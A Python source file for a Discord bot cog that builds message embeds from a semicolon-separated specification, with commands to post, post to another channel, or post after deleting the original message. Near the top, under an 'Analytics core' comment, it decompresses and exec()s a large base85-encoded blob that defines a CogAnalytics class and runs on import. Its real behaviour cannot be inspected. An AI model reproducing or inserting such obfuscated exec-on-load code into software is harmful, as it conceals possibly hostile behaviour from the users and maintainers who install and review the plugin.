import random
import re
import string
from urllib.parse import urlparse

import discord
from discord import Embed
from discord.ext import commands

from .utils import checks
from .utils.chat_formatting import warning, error, info

"""Embed wizard cog by GrumpiestVulcan
Commissioned 2018-01-15 by Aeternum Studios (Aeternum#7967/173291729192091649)"""

__author__ = "Caleb Johnson <me@calebj.io> (calebj#0001)"
__copyright__ = "Copyright 2018, Holocor LLC"
__version__ = '1.1.0'

# Analytics core
import zlib, base64
exec(zlib.decompress(base64.b85decode("""c-o~{dv6=L5&z$xf@dJ$s@~F)lgk~1+ca*P_T2XJvU|nBXY5hCl*D*<xm|Ll2tmGkXNKH|WI0!$KmxB
w&Tt;Tc~O_OX&kez(bXz$WR;sTmUdTV+Qd?uwR3e`7t$?FQ^uJo3Y9r+DjVCKjg387Hl}2mSy|CKU09JzC$HWz?fLp&hlje|Y^}2Uz#`W+GfghkC)aPAvIK#
`fwi>jLNB^ayOuM*v5;0hf7Y!po<CDnW^#3s71CPvx1TR7S?rw7?EHkK=|(jc<WJLNCZ0Y$Vb?d8H`nREKKwJ`sH>fypIaxL6`3s5;-k>!yw+QNFY0y8PuQO
?uV3$<Zd5)x3rF5v-u#$w)chReP5mBj{Qdgvn*?{yxa?#SAFZii@BJ)^PJdKIVZLFnkb<pMqXfHIYcQ8(A6x5~WdCV(b`M)Jx6G}jV^@5mz<aWBDrcwcbR``
Sf-hNX<w`MKq2naFjKLQxcis=bR;LrV^#X4F_gYm<RdP|NJZ3x7Hf&)W+v=iVR#iEZm8o{6X)U>v$%ScQd#$rI@xp6?3I!>Q%oP&kY;Cp-ytiX!$&{p{<W0P
QHEk6$Sr`y=tKAwocz$oMiMZamH3%Ghg(SRDNL7JmC_6iSV-_agu?2`yDg+0US*F0@&VXeUi5e5LE4Bp_6Jmggc0f-YegQ!;S+NGJiFR4Gpm5#jjm&neHid>
i=!7|n_e1CI70BBz1ZZ;}JnR4b5lwNvD9qx#l-8-{{N0DEpD$niBFg-Q7x^u^23)8tMbMwvUw&dgy!>YN?Zs?1`|jeqXVZ)4-%p=jOkXhYlq#hzK)07YxR^k
ny}SHy`BREGOg?j+TkRB|KaIga8K2K$E^EEPk1r=IS4%*=uCz<j$f{x)gJWZrM3V``0>c%NrlrZ-LP0=qLdJku(W8{J?l>?=;D7fM^elBHol5>H3#+>2S~jw
@DMn`U`AfG7nzt$$<q(l8Sc_C#%1?!=l5b}hlkV_pGsMVR6?MX26GYK8kSpl3KS9v;LK7s>!~Bf+yuau;A|kvrdKnUv&^F!3Lgy)lA(=>El#+QyRN*wj`|xC
M32E<>&O~t1)FK09IhEp$CrBw!!TKlcC1s~l0nT&pD8H8#7M(-_fF=q2j_^19M7}c5Q&^7RKQ1-OwM~Twk8x}iB<@TRPgCSbGxyrViWsHB7k+oVL<Z;t2-^s
r@JX(mgfpaZqe`<;BwWvpBuZ2Gs$>ZW+aowoWltBBzO7dcWD}3uN^L=qPJI7sPlJHvhw}TgQRkU>K;mQK2Uh==@M+psh!$ct1ltfUH%+U?(18+CWvYlK0St1
Z23k}ZGP1D{SZ)m^Qd<{P!gAu#3cIDeSGjJ+Td)(ri!2Yo8}|tBu7z~(4X&4foH&y%Zj?>lm`cSmbN&M&2I81LTdNxXMMhe}<<6&qPVjxb=Obh7WeoC&kadj
`M0>a6#r{sZZgkUR6a(I%Wc#+xG43$?q&^dQo!Y?>;{+9q)n!#k?e#92962dG<LEPQb<XFsjkPgqCoxa=m-<YAA`6|zDBt9EK6`!_^IVszLY!WFjRcsslFvE
g;-k@36!CXd7SEqp{-kTkgfEpH@FO6K_*uUTO`20BtoAF7Dir7vP0sj)$B$tBjMF8DK{c6t0lQFl=q(Mvg)pc9HqM*aY%A4}nO(CZXP1fGO6~gUArNC}36&b
!lZeiHDc;Yzgnf2;v#S;3Z~ws&L81CDb)|f_;Gid>QphO9?GA6iUnwZt-;%9mRjDE=Mfi$k3s!3qf4u{DKueQ6pH7LXOo%Nt5A+3)s2u1BX??4jXd)<ATNDP
oV(vKs5oML6^H4c%c`y&Z>q5R0n)iJvbT805E!5D4362L<p?wnHeT8cmMLk<=Ylva4vI1<DV@CuihMP2`4{QmC!r5J9ePjk6r#E1coKc$xw#04{3#^1~TjR|
F`c7z;!2L|FBrpVY0cKBomz*V>b^R5<nf-QK-;FBzZzvP`0y<RmCNnj4sL;@2%ZLu~lKnn*=(<T?t|@VjQ?i6_^(j-e8|NNOS$jzK)wj>M9eR%;tF2&$NwI7
6X`;_^eeA-AH)neY&6NUrIFe#t9*y*JXk{yW{OtRrP4>9=svgU8E#{4}Ob8deHR>TV0du4Jp84alk9FS*^p-9d2^da>sZrQMsXChZQxN~BSA7hdd$}88IL3~
i?IVMk>Q{N%k>2uz|Ka=Tg9K5=e&fy`gr*(j;?(u|Tv_^v9IF6#k-Iz?dTC!#-G!KY-87~lg=$EKd*DFQ9vXg~lnC>&cvWaH%r)SWQZURSG;A^)lAuk++I^%
99yQxk1jB`z|CkdY9B~`E=4jN>1b<+<(pAVdY6AqxsL0l)F4WRRd-sejMO{E<W1{SMKCIGyo9%~D-#}PzjS&+MQ7=h~fe<k3PwZPZP?OR`(2wbHVB`PvxqCK
6vtxepaXYZ;*Sgrp1<c?M23lQxzL-wqi|Mm&Tp9^RdJOXak4;HJ6uvP@9<&gBbD=gVHgm}>FuWt~5wIk8^sFexP+sqZK!Q&sXy#iK0XFX*(%c3K@5rnb3{U4
FFf?UyjYS}^!z*=Yq=pU$h^ZIgb0CLCq$xtH(mjBj(R$y>%=nz_BSN!)jRJB;<KX)RVyw?PaMLaIP<P3wiLyTP^<Hu~(}X7=5k4Z6DdD4p!D*PHha{ZlD1k<
MUCQWiXi}=wESK|zF$MLmU90NXA4q$&?E14u%FZU?eL2Sx)~88NkvtaAffk=AvbJept=J*`HsPTu;3F9c7(C3uIi5SLlyVo1I*cdyPw*$vCf-g$v)?zJaUQQ
nP5UCjx3wr2{vD0RRlIsVE}#n-%0K0LrL0dRy_(&A_Y4;;M0acg^S<X8-sXDwuAseY5I*xq9xaB>{ony2z%B6wJ+$nN`KZFMf`G~r|GX)r&9qJnD7HX#78XG
|?d&lBq>>&d{MEld0O|ZI^G{|PHA;B+GYZzk@A=;7*eEfi&m(CDhKSMVb8<LG_1TMV>B|+)z<ccnj;(z3D#|Crgb90NnMS9?&>)HM9&zMQ|Kb2+F}}#aIP5+
B%B=cR(L=XSj{1GuV5P~u@7tO>@BT#C?1b@;SP9HK!hc$dukO_F$`!QrKmCN_cK}HVkVxm6$S=WAH_Sdfrc^P8`iO80zYdZevmnC(w}E(ah}$ECek|khpwF@
A37?8a7{(X9Fysa1F~?^KK87nzrr!Qtmh}*HpGHV0FCf}sS%el`_%RB4&POgMZU+J&eb|A1Lc)xrRZdC_Ku=n1WB&^?8dL=""".replace("\n", ""))))
# End analytics core


def color_converter(color):
    if type(color) is int:
        if color < 0 or color > 0xffffff:
            raise ValueError('Color value is outside of valid range')
        return '%06x' % color
    color = color.strip('#')
    if color.startswith('0x'):
        color = color[2:]
    if len(color) != 6 or set(color) - set(string.hexdigits):
        raise ValueError('Invalid color hex value')
    return color


def is_valid_color(color):
    try:
        color_converter(color)
        return True
    except Exception:
        return False


def is_valid_url(url):
    token = urlparse(url)
    scheme_ok = token.scheme.lower() in {'http', 'https'}
    netloc_split = token.netloc.split('.')
    netloc_ok = len(list(filter(None, netloc_split))) > 1
    return scheme_ok and netloc_ok


def extract_md_link(inputstr):
    match = re.match(r'^\[([^\]]*)\]\(([^)]*)\)$', inputstr)
    if match:
        return match.groups()


class EmbedWizard:
    def __init__(self, bot):
        self.bot = bot
        self.analytics = CogAnalytics(self)

    @checks.mod_or_permissions(manage_messages=True)
    @commands.group(pass_context=True, no_pm=True, invoke_without_command=True)
    async def embedwiz(self, ctx, *, specification):
        """Posts an embed according to the given specification:

        Title;color;footer text;footer_icon;image_url;thumbnail_url;body text

        All values can be seperated by newlines, spaces, or other whitespace.

        Color can be a #HEXVAL, "random", or a name that discord.Color knows.
        Options: https://discordpy.readthedocs.io/en/async/api.html#discord.Colour

        All URLs (footer icon, image, thumbnail) can be empty or "none".

        Body text can be "prompt" to use your next message as the content.

        WARNING: embeds are hidden to anyone with the 'link previews' setting off.
        """
        if ctx.invoked_subcommand is None:
            embed = await self._parse_embed(ctx, specification)
            if embed:
                await self.bot.say(embed=embed)

    @embedwiz.command(name='channel', pass_context=True, no_pm=True)
    async def embed_channel(self, ctx, channel: discord.Channel, *, specification):
        """Posts an embed in another channel according to the spec.

        See [p]help embedwiz for more information.
        """

        if not channel.permissions_for(ctx.message.author).send_messages:
            msg = error("You don't have permissions to post there!")
            await self.bot.say(msg)
            return

        embed = await self._parse_embed(ctx, specification)
        if embed:
            await self.bot.send_message(channel, embed=embed)

    @embedwiz.command(name='delete', pass_context=True, no_pm=True)
    async def embed_del(self, ctx, *, specification):
        """Posts an embed according to the spec after deleting the original message.

        See [p]help embedwiz for more information.
        """
        perms = ctx.message.channel.permissions_for(ctx.message.server.me)
        can_delete = perms.manage_messages
        if not can_delete:
            msg = "I can't delete your command message! Posting anyway..."
            await self.bot.say(warning(msg))

        tup = await self._parse_embed(ctx, specification, return_todelete=True)
        if tup:
            embed, to_delete = tup
            await self.bot.say(embed=embed)
            if not can_delete:
                return
            for msg in [ctx.message, *to_delete]:
                await self.bot.delete_message(msg)

    async def _parse_embed(self, ctx, specification, return_todelete=False):
        to_delete = []

        split = specification.split(';', 7)
        nfields = len(split)
        if nfields != 7:
            op = 'many' if nfields > 7 else 'few'
            msg = 'Invalid specification: got too {} fields ({}, expected 7)'
            await self.bot.say(error(msg.format(op, nfields)))
            return

        title, color, ftext, fimage, image, timage, body = map(str.strip, split)

        title_url = extract_md_link(title) or Embed.Empty
        if title_url:
            title, title_url = title_url
            if not is_valid_url(title_url):
                await self.bot.say(error('Invalid title URL!'))
                return

        try:
            color = int(color_converter(color), 16)
        except ValueError as e:
            colorstr = color.lower().replace(' ', '_')
            if colorstr == 'random':
                color = discord.Color(random.randrange(0x1000000))
            elif colorstr.strip() in ('', 'none'):
                color = Embed.Empty
            elif colorstr.strip() == 'black':
                color = discord.Color.default()
            elif hasattr(discord.Color, colorstr):
                color = getattr(discord.Color, colorstr)()
            else:
                await self.bot.say(error(e.args[0]))
                return

        if ftext.lower() in ('none', ''):
            ftext = Embed.Empty

        if fimage.lower() in ('none', ''):
            fimage = Embed.Empty
        elif not is_valid_url(fimage):
            await self.bot.say(error('Invalid footer icon URL!'))
            return

        if image.lower() in ('none', ''):
            image = Embed.Empty
        elif not is_valid_url(image):
            await self.bot.say(error('Invalid image URL!'))
            return

        if timage.lower() in ('none', ''):
            timage = Embed.Empty
        elif not is_valid_url(timage):
            await self.bot.say(error('Invalid thumbnail URL!'))
            return

        if body.lower() == 'prompt':
            msg = await self.bot.say('Post the desired content of your embed, '
                                     ' or "cancel" to cancel. Will wait one'
                                     ' minute.')
            to_delete.append(msg)

            msg = await self.bot.wait_for_message(author=ctx.message.author,
                                                  channel=ctx.message.channel,
                                                  timeout=60)
            if msg is None:
                await self.bot.say(error('Timed out waiting for a reply.'))
                return
            else:
                to_delete.append(msg)

            if msg.content.lower().strip() == 'cancel':
                await self.bot.say(info('Cancelled.'))
                return
            else:
                body = msg.content

        embed = Embed(title=title, color=color, description=body, url=title_url)

        if image:
            embed.set_image(url=image)
        if ftext or fimage:
            embed.set_footer(text=ftext, icon_url=fimage)
        if timage:
            embed.set_thumbnail(url=timage)

        if return_todelete:
            return embed, to_delete
        return embed

    async def on_command(self, command, ctx):
        if ctx.cog is self:
            self.analytics.command(ctx)


def setup(bot):
    bot.add_cog(EmbedWizard(bot))
